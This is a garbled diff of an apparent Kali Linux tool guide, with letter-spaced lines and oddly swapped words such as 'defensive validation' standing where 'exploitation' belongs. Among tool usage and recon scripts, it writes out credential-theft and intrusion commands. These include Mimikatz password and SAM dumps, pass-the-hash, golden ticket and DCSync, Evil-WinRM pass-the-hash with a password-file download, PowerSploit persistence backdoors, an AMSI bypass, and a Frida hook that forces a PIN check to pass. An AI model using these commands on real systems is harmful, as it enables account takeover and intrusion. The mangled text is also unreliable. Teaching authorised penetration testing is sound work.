+# Logcat
+a d b  l o g c a t  |  g r e p  - i  p a s s w o r d
+# Screen capture
+a d b  s h e l l  s c r e e n c a p  / s d c a r d / s c r e e n . p n g
+# Package management
+adb shell pm list packages
+adb shell pm path c o m . e x a m p l e . a p p
+# Activity manager
+a d b  s h e l l  a m  s t a r t  - n  c o m . e x a m p l e . a p p / . M a i n A c t i v i t y
+# Start MobSF
+# API usage for automation
+# Upload APK
 c u r l  - F  " f i l e = @ a p p . a p k "  h t t p : / / l o c a l h o s t : 8 0 0 0 / a p i / v 1 / u p l o a d  - H  " A u t h o r i z a t i o n :
-A P I _ K E Y "  
-#  S c a n  
-
-#  I n t e r a c t i v e  m o d e  
-#  L i s t  p r o c e s s e s
-f r i d a - p s  - U  
-#  A t t a c h  t o  p r o c e s s
-f r i d a  - U  c o m . e x a m p l e . a p p  
-#  R u n  s c r i p t
-f r i d a  - U  - l  s c r i p t . j s  c o m . e x a m p l e . a p p  
-#  B a s i c  h o o k i n g  s c r i p t
-J a v a . p e r f o r m ( f u n c t i o n ( )  {  
+A P I _ K E Y "
+# Scan
+# Interactive mode
+# List processes
+f r i d a - p s - U
+# Attach to process
+frida - U c o m . e x a m p l e . a p p
+# Run script
+frida - U - l s c r i p t . j s c o m . e x a m p l e . a p p
+# Basic hooking script
+J a v a . p e r f o r m ( f u n c t i o n ( )  &#123;
 v a r  M a i n A c t i v i t y  =  J a v a . u s e ( ' c o m . e x a m p l e . a p p . M a i n A c t i v i t y ' ) ;
-M a i n A c t i v i t y . c h e c k P i n . i m p l e m e n t a t i o n  =  f u n c t i o n ( p i n )  {  
+M a i n A c t i v i t y . c h e c k P i n . i m p l e m e n t a t i o n  =  f u n c t i o n ( p i n )  &#123;
 c o n s o l e . l o g ( ' P I N :  '  +  p i n ) ;
-r e t u r n  t r u e ;  
-} ;  
-} ) ;  
-#  S p a w n  a n d  a t t a c h
-f r i d a  - U  - f  c o m . e x a m p l e . a p p  - l  s c r i p t . j s  - - n o - p a u s e  
-#  T r a c e  A P I  c a l l s
-f r i d a - t r a c e  - U  - i  " o p e n * "  c o m . e x a m p l e . a p p  
+return t r u e ;
+# Spawn and attach
+frida - U - f c o m . e x a m p l e . a p p - l s c r i p t . j s - - n o - p a u s e
+# Trace API calls
+f r i d a - t r a c e - U - i " o p e n * " c o m . e x a m p l e . a p p
 c u r l  - X  P O S T  h t t p : / / l o c a l h o s t : 8 0 0 0 / a p i / v 1 / s c a n  - H  " A u t h o r i z a t i o n :  A P I _ K E Y "  - d
-" h a s h = f i l e _ h a s h "  
-#  G e t  r e p o r t
+" h a s h = f i l e _ h a s h "
+# Get report
 c u r l  h t t p : / / l o c a l h o s t : 8 0 0 0 / a p i / v 1 / r e p o r t _ j s o n ? h a s h = f i l e _ h a s h  - H  " A u t h o r i z a t i o n :
-A P I _ K E Y "  
-#  D y n a m i c  a n a l y s i s
-#  C o n f i g u r e  w i t h  G e n y m o t i o n / A n d r o i d  S t u d i o  e m u l a t o r  
-40. Frida  
-41. Hashidentifier  
-Hashtypeidentificationtool:  
-Dynamicinstrumentation toolkit:  
-C r y p t o g r a p h y  a n d  S t e g a n o g r a p h y  T o o l s  
-
-#  S c a n  f o r  e m b e d d e d  f i l e s
-b i n w a l k  f i r m w a r e . b i n  
-#  E x t r a c t  f i l e s
-b i n w a l k  - e  f i r m w a r e . b i n  
-#  E n t r o p y  a n a l y s i s
-b i n w a l k  - E  f i r m w a r e . b i n  
-#  C u s t o m  s i g n a t u r e s
-b i n w a l k  - m  c u s t o m . s i g  f i r m w a r e . b i n  
-#  E m b e d  f i l e
-s t e g h i d e  e m b e d  - c f  i m a g e . j p g  - e f  s e c r e t . t x t  - p  p a s s w o r d  
-#  E x t r a c t  f i l e
-s t e g h i d e  e x t r a c t  - s f  i m a g e . j p g  - p  p a s s w o r d  
-#  G e t  i n f o
-s t e g h i d e  i n f o  i m a g e . j p g  
-#  B r u t e  f o r c e  w i t h  s t e g c r a c k e r
-s t e g c r a c k e r  i m a g e . j p g  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t  
-#  C h e c k  c a p a c i t y
-s t e g h i d e  i n f o  i m a g e . j p g  
-h a s h - i d e n t i f i e r  
-#  E x a m p l e s :
+A P I _ K E Y "
+# Dynamic analysis
+#  C o n f i g u r e  w i t h  G e n y m o t i o n / A n d r o i d  S t u d i o  e m u l a t o r
+40. Frida
+41. Hashidentifier
+Hashtypeidentificationtool:
+Dynamicinstrumentation toolkit:
+Cryptography and Steganography Tools
+# Scan for embedded files
+binwalk f i r m w a r e . b i n
+# Extract files
+binwalk - e f i r m w a r e . b i n
+# Entropy analysis
+binwalk - E f i r m w a r e . b i n
+# Custom signatures
+binwalk - m c u s t o m . s i g f i r m w a r e . b i n
+# Embed file
+steghide embed - c f i m a g e . j p g - e f s e c r e t . t x t - p password
+# Extract file
+steghide extract - s f i m a g e . j p g - p password
+# Get info
+steghide info i m a g e . j p g
+# Brute force with stegcracker
+s t e g c r a c k e r  i m a g e . j p g  / u s r / s h a r e / w o r d l i s t s / r o c k y o u . t x t
+# Check capacity
+steghide info i m a g e . j p g
+h a s h - i d e n t i f i e r
+# E x a m p l e s :
 #  M D 5 :  3 2  c h a r a c t e r s  ( 1 2 8  b i t s )
 #  S H A - 1 :  4 0  c h a r a c t e r s  ( 1 6 0  b i t s )
 #  S H A - 2 5 6 :  6 4  c h a r a c t e r s  ( 2 5 6  b i t s )
-#  S H A - 5 1 2 :  1 2 8  c h a r a c t e r s  ( 5 1 2  b i t s )  
-#  C o m m o n  h a s h  i d e n t i f i c a t i o n
-e c h o  " 5 d 4 1 4 0 2 a b c 4 b 2 a 7 6 b 9 7 1 9 d 9 1 1 0 1 7 c 5 9 2 "  |  h a s h - i d e n t i f i e r  
-43. Binwalk  
-42. Steghide  
-Steganographytool for hiding data:  
-Firmwareanalysis and extraction tool:  
-
-#  R e c u r s i v e  e x t r a c t i o n
-b i n w a l k  - M e  f i r m w a r e . b i n  
-#  H e x d u m p
-b i n w a l k  - W  f i r m w a r e . b i n  
-#  I m p o r t  m o d u l e
-I m p o r t - M o d u l e  P o w e r S p l o i t . p s d 1  
-#  I n v o k e - M i m i k a t z
-I n v o k e - M i m i k a t z  - D u m p C r e d s  
+#  S H A - 5 1 2 :  1 2 8  c h a r a c t e r s  ( 5 1 2  b i t s )
+# Common hash identification
+e c h o  " 5 d 4 1 4 0 2 a b c 4 b 2 a 7 6 b 9 7 1 9 d 9 1 1 0 1 7 c 5 9 2 "  |  h a s h - i d e n t i f i e r
+43. Binwalk
+42. Steghide
+Steganographytool for hiding data:
+Firmwareanalysis and extraction tool:
+# Recursive extraction
+binwalk - M e f i r m w a r e . b i n
+# Hexdump
+binwalk - W f i r m w a r e . b i n
+# Import module
+I m p o r t - M o d u l e P o w e r S p l o i t . p s d 1
+# I n v o k e - M i m i k a t z
+I n v o k e - M i m i k a t z - D u m p C r e d s
 #  P o w e r U p  ( p r i v i l e g e  e s c a l a t i o n )
-I n v o k e - A l l C h e c k s  
+I n v o k e - A l l C h e c k s
 #  B a s i c  u s a g e  ( f r o m  M e t e r p r e t e r )
-l o a d  m i m i k a t z
-m i m i k a t z _ c o m m a n d  - f  s e k u r l s a : : l o g o n P a s s w o r d s  
-#  S t a n d a l o n e  u s a g e
+load mimikatz
+m i m i k a t z _ c o m m a n d - f s e k u r l s a : : l o g o n P a s s w o r d s
+# Standalone usage
 m i m i k a t z . e x e
 p r i v i l e g e : : d e b u g
 s e k u r l s a : : l o g o n p a s s w o r d s
 l s a d u m p : : s a m
-l s a d u m p : : s e c r e t s  
-#  P a s s  t h e  h a s h
-s e k u r l s a : : p t h  / u s e r : A d m i n i s t r a t o r  / d o m a i n : t a r g e t . l o c a l  / n t l m : h a s h  
-#  G o l d e n  t i c k e t
+l s a d u m p : : s e c r e t s
+# Pass the hash
+s e k u r l s a : : p t h  / u s e r : A d m i n i s t r a t o r  / d o m a i n : t a r g e t . l o c a l  / n t l m : h a s h
+# Golden ticket
 k e r b e r o s : : g o l d e n  / u s e r : A d m i n i s t r a t o r  / d o m a i n : t a r g e t . l o c a l  / s i d : S - 1 - 5 - 2 1 - . . .
-/ k r b t g t : h a s h  
-#  D C S y n c
-l s a d u m p : : d c s y n c  / d o m a i n : t a r g e t . l o c a l  / u s e r : A d m i n i s t r a t o r  
-P o s t - E x p l o i t a t i o n  T o o l s  
-44. Mimikatz  
-45. PowerSploit  
-Windowscredential extraction tool:  
-PowerShellpost-exploitation framework:  
-
-#  S t a r t  D r a d i s
-s e r v i c e  d r a d i s  s t a r t  
-#  B a s i c  c o n n e c t i o n
-e v i l - w i n r m  - i  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  A d m i n i s t r a t o r  - p  p a s s w o r d  
-#  P a s s  t h e  h a s h
-e v i l - w i n r m  - i  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  A d m i n i s t r a t o r  - H  n t l m _ h a s h  
-#  S S L  c o n n e c t i o n
-e v i l - w i n r m  - i  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  A d m i n i s t r a t o r  - p  p a s s w o r d  - S  
+/ k r b t g t : h a s h
+# DCSync
+l s a d u m p : : d c s y n c  / d o m a i n : t a r g e t . l o c a l  / u s e r : A d m i n i s t r a t o r
+P o s t - E x p l o i t a t i o n Tools
+44. Mimikatz
+45. PowerSploit
+Windowscredential extraction tool:
+PowerShellpost-defensive validation framework:
+# Start Dradis
+service dradis start
+# Basic connection
+e v i l - w i n r m - i 1 9 2 . 1 6 8 . 1 . 1 0 0 - u Administrator - p password
+# Pass the hash
+e v i l - w i n r m  - i  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  A d m i n i s t r a t o r  - H  n t l m _ h a s h
+# SSL connection
+e v i l - w i n r m - i 1 9 2 . 1 6 8 . 1 . 1 0 0 - u Administrator - p password - S
 #  U p l o a d / D o w n l o a d  f i l e s
 u p l o a d  l o c a l _ f i l e . t x t  C : \ W i n d o w s \ T e m p \ f i l e . t x t
-d o w n l o a d  C : \ U s e r s \ A d m i n i s t r a t o r \ D e s k t o p \ p a s s w o r d s . t x t  / t m p / p a s s . t x t  
-#  L o a d  P o w e r S h e l l  s c r i p t s
-m e n u
-B y p a s s - 4 M S I  
-
+d o w n l o a d  C : \ U s e r s \ A d m i n i s t r a t o r \ D e s k t o p \ p a s s w o r d s . t x t  / t m p / p a s s . t x t
+# Load PowerShell scripts
+menu
+B y p a s s - 4 M S I
 #  P o w e r V i e w  ( A D  e n u m e r a t i o n )
 G e t - N e t D o m a i n
 G e t - N e t U s e r
 G e t - N e t G r o u p
-G e t - N e t C o m p u t e r  
-#  I n v o k e - T o k e n M a n i p u l a t i o n
-I n v o k e - T o k e n M a n i p u l a t i o n  - E n u m e r a t e
-I n v o k e - T o k e n M a n i p u l a t i o n  - I m p e r s o n a t e U s e r  - U s e r n a m e  " D O M A I N \ A d m i n i s t r a t o r "  
-#  P e r s i s t e n c e
+G e t - N e t C o m p u t e r
+# I n v o k e - T o k e n M a n i p u l a t i o n
+I n v o k e - T o k e n M a n i p u l a t i o n - E n u m e r a t e
+I n v o k e - T o k e n M a n i p u l a t i o n  - I m p e r s o n a t e U s e r  - U s e r n a m e  " D O M A I N \ A d m i n i s t r a t o r "
+# Persistence
 I n v o k e - E v e n t L o g B a c k d o o r
-I n v o k e - S e r v i c e P e r s i s t e n c e  
-47. Dradis  
-46. Evil-WinRM  
-WindowsRemoteManagement shell:  
-Collaborationand reporting framework:  
-R e p o r t i n g  a n d  D o c u m e n t a t i o n  T o o l s  
-
-#  L a u n c h  C h e r r y T r e e
-c h e r r y t r e e  
-#  F e a t u r e s :
-#  -  S y n t a x  h i g h l i g h t i n g
-#  -  R i c h  t e x t  f o r m a t t i n g
-#  -  I m a g e  e m b e d d i n g
-#  -  C o d e  e x e c u t i o n
-#  -  E n c r y p t i o n  s u p p o r t
-#  -  I m p o r t / E x p o r t  c a p a b i l i t i e s  
-#  C o m m a n d  l i n e  
-#  A c c e s s  w e b  i n t e r f a c e
-#  h t t p : / / l o c a l h o s t : 3 0 0 0  
-#  I m p o r t  f i n d i n g s
-#  S u p p o r t s :  N m a p ,  B u r p ,  N e s s u s ,  Q u a l y s ,  e t c .  
-#  A P I  u s a g e
-c u r l  - u  u s e r : p a s s w o r d  h t t p : / / l o c a l h o s t : 3 0 0 0 / a p i / n o d e s  
-#  E x p o r t  r e p o r t s
-#  F o r m a t s :  W o r d ,  E x c e l ,  P D F ,  H T M L  
-#  S t a r t  F a r a d a y
+I n v o k e - S e r v i c e P e r s i s t e n c e
+47. Dradis
+46. Evil-WinRM
+WindowsRemoteManagement shell:
+Collaborationand reporting framework:
+Reporting and Documentation Tools
+# Launch CherryTree
+# F e a t u r e s :
+# - Syntax highlighting
+# - Rich text formatting
+# - Image embedding
+# - Code execution
+# - Encryption support
+#  -  I m p o r t / E x p o r t  c a p a b i l i t i e s
+# Command line
+# Access web interface
+#  h t t p : / / l o c a l h o s t : 3 0 0 0
+# Import findings
+# S u p p o r t s : N m a p , B u r p , N e s s u s , Q u a l y s , e t c .
+# API usage
+c u r l  - u  u s e r : p a s s w o r d  h t t p : / / l o c a l h o s t : 3 0 0 0 / a p i / n o d e s
+# Export reports
+# F o r m a t s : W o r d , E x c e l , P D F , HTML
+# Start Faraday
 f a r a d a y - s e r v e r
-f a r a d a y - c l i e n t  
-#  I m p o r t  t o o l  o u t p u t s
-#  A u t o m a t i c  d e t e c t i o n  a n d  p a r s i n g  
-#  A P I  e x a m p l e s
+f a r a d a y - c l i e n t
+# Import tool outputs
+# Automatic detection and parsing
+# API examples
 c u r l  - X  G E T  h t t p : / / l o c a l h o s t : 5 9 8 5 / v 2 / w s /
-c u r l  - X  P O S T  h t t p : / / l o c a l h o s t : 5 9 8 5 / v 2 / w s / w o r k s p a c e _ n a m e / h o s t s /  
-#  P l u g i n  u s a g e
-#  S u p p o r t s  8 0 +  s e c u r i t y  t o o l s  
-48. Faraday  
-49. CherryTree  
-Collaborativepenetration test IDE:  
-Hierarchicalnote-taking application:  
-
-#  B a s i c  a n a l y s i s
-p i p a l  p a s s w o r d s . t x t  
-#  O u t p u t  t o  f i l e
-p i p a l  p a s s w o r d s . t x t  &gt;  a n a l y s i s . t x t  
-#  C o m m o n  a n a l y s i s  r e s u l t s :
-#  -  T o p  p a s s w o r d s
-#  -  C h a r a c t e r  s e t s
-#  -  P a s s w o r d  l e n g t h s
-#  -  C o m m o n  p a t t e r n s
-#  -  K e y b o a r d  p a t t e r n s
-#  -  D a t e  p a t t e r n s  
-#  C u s t o m  c h e c k s
-p i p a l  - - p l u g i n  c u s t o m . r b  p a s s w o r d s . t x t  
-c h e r r y t r e e  - - f i l e p a t h = / p a t h / t o / n o t e s . c t b  
+c u r l  - X  P O S T  h t t p : / / l o c a l h o s t : 5 9 8 5 / v 2 / w s / w o r k s p a c e _ n a m e / h o s t s /
+# Plugin usage
+# Supports 8 0 + security tools
+48. Faraday
+49. CherryTree
+Collaborativepenetration test IDE:
+Hierarchicalnote-taking application:
+# Basic analysis
+pipal p a s s w o r d s . t x t
+# Output to file
+pipal p a s s w o r d s . t x t &gt; a n a l y s i s . t x t
+# Common analysis r e s u l t s :
+# - Top passwords
+# - Character sets
+# - Password lengths
+# - Common patterns
+# - Keyboard patterns
+# - Date patterns
+# Custom checks
+pipal - - p l u g i n c u s t o m . r b p a s s w o r d s . t x t
+c h e r r y t r e e  - - f i l e p a t h = / p a t h / t o / n o t e s . c t b
 # ! / b i n / b a s h
-#  A u t o m a t e d  r e c o n n a i s s a n c e  a n d  v u l n e r a b i l i t y  a s s e s s m e n t  
+# Automated reconnaissance and vulnerability assessment
 T A R G E T = " $ 1 "
 O U T P U T _ D I R = " . / a s s e s s m e n t _ $ ( d a t e  + % Y % m % d _ % H % M % S ) "
-m k d i r  - p  " $ O U T P U T _ D I R "  
-e c h o  " [ * ]  S t a r t i n g  c o m p r e h e n s i v e  a s s e s s m e n t  o f  $ T A R G E T "  
-#  N e t w o r k  r e c o n n a i s s a n c e
+mkdir - p " $ O U T P U T _ D I R "
+e c h o  " [ * ]  S t a r t i n g  c o m p r e h e n s i v e  a s s e s s m e n t  o f  $ T A R G E T "
+# Network reconnaissance
 e c h o  " [ * ]  R u n n i n g  N m a p  s c a n . . . "
-n m a p  - s V  - s C  - O  - A  - T 4  - o A  " $ O U T P U T _ D I R / n m a p _ s c a n "  " $ T A R G E T "  
-#  E x t r a c t  o p e n  p o r t s
+n m a p  - s V  - s C  - O  - A  - T 4  - o A  " $ O U T P U T _ D I R / n m a p _ s c a n "  " $ T A R G E T "
+# Extract open ports
 P O R T S = $ ( g r e p  - o P  ' \ d + / o p e n '  " $ O U T P U T _ D I R / n m a p _ s c a n . g n m a p "  |  c u t  - d ' / '  - f 1  |  t r
-' \ n '  ' , '  |  s e d  ' s / , $ / / ' )  
-50. Pipal  
-Combining Tools for Comprehensive Assessments  
-Passwordanalysis tool:  
-Professionalpenetrationtestingrequiresseamlessintegrationofmultipletools:  
-A d v a n c e d  T o o l  I n t e g r a t i o n  a n d  A u t o m a t i o n  
-
+' \ n '  ' , '  |  s e d  ' s / , $ / / ' )
+50. Pipal
+Combining Tools for Comprehensive Assessments
+Passwordanalysis tool:
+Professionalpenetrationtestingrequiresseamlessintegrationofmultipletools:
+Advanced Tool Integration and Automation
 # ! / u s r / b i n / e n v  p y t h o n 3
-#  C u s t o m  s e c u r i t y  a s s e s s m e n t  t o o l  
-i m p o r t  s u b p r o c e s s  
-
-#  W e b  a p p l i c a t i o n  s c a n n i n g
+# Custom security assessment tool
+&#8203;import subprocess
+# Web application scanning
 i f  e c h o  " $ P O R T S "  |  g r e p  - q  " 8 0 \ | 4 4 3 \ | 8 0 8 0 \ | 8 4 4 3 " ;  t h e n
 e c h o  " [ * ]  W e b  s e r v i c e s  d e t e c t e d .  R u n n i n g  N i k t o . . . "
-n i k t o  - h  " h t t p : / / $ T A R G E T "  - o  " $ O U T P U T _ D I R / n i k t o _ s c a n . t x t "  
+n i k t o  - h  " h t t p : / / $ T A R G E T "  - o  " $ O U T P U T _ D I R / n i k t o _ s c a n . t x t "
 e c h o  " [ * ]  R u n n i n g  D i r b . . . "
-d i r b  " h t t p : / / $ T A R G E T "  - o  " $ O U T P U T _ D I R / d i r b _ s c a n . t x t "  
+d i r b  " h t t p : / / $ T A R G E T "  - o  " $ O U T P U T _ D I R / d i r b _ s c a n . t x t "
 e c h o  " [ * ]  R u n n i n g  W P S c a n  i f  W o r d P r e s s  d e t e c t e d . . . "
-w p s c a n  - - u r l  " h t t p : / / $ T A R G E T "  - - e n u m e r a t e  a p , a t , c b , d b e  - o  
+w p s c a n  - - u r l  " h t t p : / / $ T A R G E T "  - - e n u m e r a t e  a p , a t , c b , d b e  - o
 " $ O U T P U T _ D I R / w p s c a n . t x t "
-f i  
-#  V u l n e r a b i l i t y  s c a n n i n g
+f i
+# Vulnerability scanning
 e c h o  " [ * ]  R u n n i n g  v u l n e r a b i l i t y  a s s e s s m e n t . . . "
-n m a p  - - s c r i p t  v u l n  - p " $ P O R T S "  " $ T A R G E T "  - o A  " $ O U T P U T _ D I R / n m a p _ v u l n _ s c a n "  
-#  G e n e r a t e  r e p o r t
+n m a p  - - s c r i p t  v u l n  - p " $ P O R T S "  " $ T A R G E T "  - o A  " $ O U T P U T _ D I R / n m a p _ v u l n _ s c a n "
+# Generate report
 e c h o  " [ * ]  G e n e r a t i n g  p r e l i m i n a r y  r e p o r t . . . "
-c a t  &gt;  " $ O U T P U T _ D I R / p r e l i m i n a r y _ r e p o r t . m d "  < <  E O F
-#  S e c u r i t y  A s s e s s m e n t  R e p o r t
-T a r g e t :  $ T A R G E T
-D a t e :  $ ( d a t e )  
-# #  N e t w o r k  S e r v i c e s
-$ ( c a t  " $ O U T P U T _ D I R / n m a p _ s c a n . n m a p "  |  g r e p  - E  " ^ \ d + / t c p | ^ \ d + / u d p " )  
-# #  P o t e n t i a l  V u l n e r a b i l i t i e s
+c a t  &gt;  " $ O U T P U T _ D I R / p r e l i m i n a r y _ r e p o r t . m d "  &lt; &lt;  E O F
+# Security Assessment Report
+T a r g e t : $ T A R G E T
+D a t e :  $ ( d a t e )
+# # Network Services
+$ ( c a t  " $ O U T P U T _ D I R / n m a p _ s c a n . n m a p "  |  g r e p  - E  " ^ \ d + / t c p | ^ \ d + / u d p " )
+# # Potential Vulnerabilities
 $ ( g r e p  - h  " V U L N E R A B L E "  " $ O U T P U T _ D I R " / * . t x t  2 &gt; / d e v / n u l l  | |  e c h o  " N o  a u t o m a t i c
-v u l n e r a b i l i t i e s  d e t e c t e d " )  
-# #  R e c o m m e n d a t i o n s  -  R e v i e w  a l l  i d e n t i f i e d
-s e r v i c e s  -  I n v e s t i g a t e  p o t e n t i a l  v u l n e r a b i l i t i e s
-m a n u a l l y  -  P e r f o r m  a u t h e n t i c a t e d  t e s t i n g  w h e r e
-a p p l i c a b l e  E O F  
-e c h o  " [ * ]  A s s e s s m e n t  c o m p l e t e .  R e s u l t s  s a v e d  t o  $ O U T P U T _ D I R "  
-Custom Tool Development  
-Creatingcustomtoolsforspecifictesting scenarios:  
-
-i m p o r t  j s o n
-i m p o r t  a r g p a r s e
-f r o m  d a t e t i m e  i m p o r t  d a t e t i m e  
-c l a s s  S e c u r i t y A s s e s s o r :  
-d e f  _ _ i n i t _ _ ( s e l f ,  t a r g e t ) :  
+v u l n e r a b i l i t i e s  d e t e c t e d " )
+# # Recommendations - Review all identified
+services - Investigate potential vulnerabilities
+manually - Perform authenticated testing where
+applicable EOF
+e c h o  " [ * ]  A s s e s s m e n t  c o m p l e t e .  R e s u l t s  s a v e d  t o  $ O U T P U T _ D I R "
+Custom Tool Development
+Creatingcustomtoolsforspecifictesting scenarios:
+&#8203;import json
+&#8203;import argparse
+from datetime import datetime
+class S e c u r i t y A s s e s s o r :
+d e f  _ _ i n i t _ _ ( s e l f ,  t a r g e t ) :
 s e l f . t a r g e t  =  t a r g e t
-s e l f . r e s u l t s  =  {  
-' t a r g e t ' :  t a r g e t ,
+s e l f . r e s u l t s  =  &#123;
+' t a r g e t ' : t a r g e t ,
 ' t i m e s t a m p ' :  d a t e t i m e . n o w ( ) . i s o f o r m a t ( ) ,
-' f i n d i n g s ' :  [ ]  
-}  
-d e f  r u n _ n m a p ( s e l f ) :  
-" " " R u n  N m a p  s c a n  a n d  p a r s e  r e s u l t s " " "
-p r i n t ( f " [ * ]  S c a n n i n g  { s e l f . t a r g e t }  w i t h  N m a p . . . " )
+' f i n d i n g s ' :  [ ]
+d e f  r u n _ n m a p ( s e l f ) :
+" " " R u n Nmap scan and parse r e s u l t s " " "
+p r i n t ( f " [ * ]  S c a n n i n g  &#123; s e l f . t a r g e t &#125;  w i t h  N m a p . . . " )
 c m d  =  [ ' n m a p ' ,  ' - s V ' ,  ' - s C ' ,  ' - o X ' ,  ' - ' ,  s e l f . t a r g e t ]
 r e s u l t  =  s u b p r o c e s s . r u n ( c m d ,  c a p t u r e _ o u t p u t = T r u e ,  t e x t = T r u e )
-#  P a r s e  X M L  o u t p u t  a n d  e x t r a c t  f i n d i n g s
-r e t u r n  r e s u l t . s t d o u t  
-d e f  c h e c k _ s s l ( s e l f ) :  
+# Parse XML output and extract findings
+return r e s u l t . s t d o u t
+d e f  c h e c k _ s s l ( s e l f ) :
 " " " C h e c k  S S L / T L S  c o n f i g u r a t i o n " " "
 p r i n t ( f " [ * ]  C h e c k i n g  S S L / T L S  c o n f i g u r a t i o n . . . " )
 c m d  =  [ ' s s l s c a n ' ,  ' - - n o - c o l o u r ' ,  s e l f . t a r g e t ]
 r e s u l t  =  s u b p r o c e s s . r u n ( c m d ,  c a p t u r e _ o u t p u t = T r u e ,  t e x t = T r u e )
-#  P a r s e  a n d  a n a l y z e  S S L  f i n d i n g s
-r e t u r n  r e s u l t . s t d o u t  
-d e f  g e n e r a t e _ r e p o r t ( s e l f ) :  
-" " " G e n e r a t e  J S O N  r e p o r t " " "
-w i t h  o p e n ( f ' a s s e s s m e n t _ { s e l f . t a r g e t . r e p l a c e ( " . " ,  " _ " ) } . j s o n ' ,  ' w ' )  a s  f :  
-j s o n . d u m p ( s e l f . r e s u l t s ,  f ,  i n d e n t = 2 )  
-i f  _ _ n a m e _ _  = =  ' _ _ m a i n _ _ ' :  
-p a r s e r  =  a r g p a r s e . A r g u m e n t P a r s e r ( d e s c r i p t i o n = ' C u s t o m  S e c u r i t y  A s s e s s m e n t  
-T o o l ' )  
+# Parse and analyze SSL findings
+return r e s u l t . s t d o u t
+d e f  g e n e r a t e _ r e p o r t ( s e l f ) :
+" " " G e n e r a t e JSON r e p o r t " " "
+w i t h  o p e n ( f ' a s s e s s m e n t _ &#123; s e l f . t a r g e t . r e p l a c e ( " . " ,  " _ " ) &#125; . j s o n ' ,  ' w ' )  a s  f :
+j s o n . d u m p ( s e l f . r e s u l t s ,  f ,  i n d e n t = 2 )
+i f  _ _ n a m e _ _  = =  ' _ _ m a i n _ _ ' :
+p a r s e r  =  a r g p a r s e . A r g u m e n t P a r s e r ( d e s c r i p t i o n = ' C u s t o m  S e c u r i t y  A s s e s s m e n t
+T o o l ' )
 p a r s e r . a d d _ a r g u m e n t ( ' t a r g e t ' ,  h e l p = ' T a r g e t  I P  o r  h o s t n a m e ' )
-a r g s  =  p a r s e r . p a r s e _ a r g s ( )  
+a r g s  =  p a r s e r . p a r s e _ a r g s ( )
 a s s e s s o r  =  S e c u r i t y A s s e s s o r ( a r g s . t a r g e t )
 a s s e s s o r . r u n _ n m a p ( )
 a s s e s s o r . c h e c k _ s s l ( )
-a s s e s s o r . g e n e r a t e _ r e p o r t ( )  
-B e s t  P r a c t i c e s  f o r  K a l i  L i n u x  T o o l  U s a g e  
-
-Tool Selection Strategy  
-Legal and Ethical Considerations  
-Choosingtherighttool forspecific tasks:  
-1. Reconnaissance Phase  
-○ Passive: Maltego, theHarvester, Recon-ng  
-○ Active: Nmap, Masscan, Dmitry  
-2. Vulnerability Assessment  
-○ Network: OpenVAS, Nessus (commercial)  
-○ Web: Burp Suite, OWASP ZAP, Nikto  
-○ System: Lynis, Wapiti  
-3. Exploitation  
-○ Framework: Metasploit, BeEF  
-○ Manual: SearchSploit, custom exploits  
-○ Social: SET, Gophish  
-1. Always Obtain Written Authorization  
+a s s e s s o r . g e n e r a t e _ r e p o r t ( )
+Best Practices for Kali Linux Tool Usage
+Tool Selection Strategy
+Legal and Ethical Considerations
+Choosingtherighttool forspecific tasks:
+1. Reconnaissance Phase
+○ Passive: Maltego, theHarvester, Recon-ng
+○ Active: Nmap, Masscan, Dmitry
+2. Vulnerability Assessment
+○ Network: OpenVAS, Nessus (commercial)
+○ Web: Burp Suite, OWASP ZAP, Nikto
+○ System: Lynis, Wapiti
+3. defensive validation
+○ Framework: Metasploit, BeEF
+○ Manual: SearchSploit, custom exploits
+○ Social: SET, Gophish
+1. Always Obtain Written Authorization
 ○ Never test systems without explicit permission
 ○ Define clear scope and boundaries
-○ Understand local and international laws  
-2. Maintain Professional Standards  
+○ Understand local and international laws
+2. Maintain Professional Standards
 ○  Document all activities thoroughly ○
 Protect client confidentiality ○  Report
-findings responsibly  
-3. Minimize System Impact  
+findings responsibly
+3. Minimize System Impact
 ○ Avoid denial-of-service conditions
 ○ Test during agreed maintenance windows
-○ Have rollback plans ready  
-UsingKaliLinuxtoolsrequiresstrictadherenceto legal and ethical guidelines:  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-│  E t h i c a l  U s a g e  F r a m e w o r k  │  
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┼ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-▼  ▼  ▼  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
-│  A u t h o r i z a t i o n  │  
-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
-│  D o c u m e n t a t i o n  │  │  S c o p e
-│  D e f i n i t i o n
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│
-│  │  R e q u i r e d
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│  │  M a n d a t o r y  │
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-│  
